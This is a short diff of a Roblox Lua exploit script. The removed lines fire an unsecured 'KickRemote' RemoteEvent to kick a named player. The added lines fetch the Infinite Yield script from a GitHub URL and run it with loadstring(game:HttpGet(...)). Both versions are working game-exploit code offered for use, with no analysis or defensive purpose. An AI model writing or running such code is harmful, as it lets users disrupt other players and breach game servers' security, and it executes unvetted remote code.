@@ -1,5 +1,10 @@
--- WARNING: This only works if the game has a broken/unsecured RemoteEvent
-local targetName = "PlayerNameHere"
-local remote = game:GetService("ReplicatedStorage"):WaitForChild("KickRemote") -- Example name
+print("Starting Test...")
+local success, err = pcall(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
+end)
 
-remote:FireServer(game.Players[targetName])
+if success then
+    print("Success: Infinite Yield loaded!")
+else
+    warn("Error: " .. err)
+end
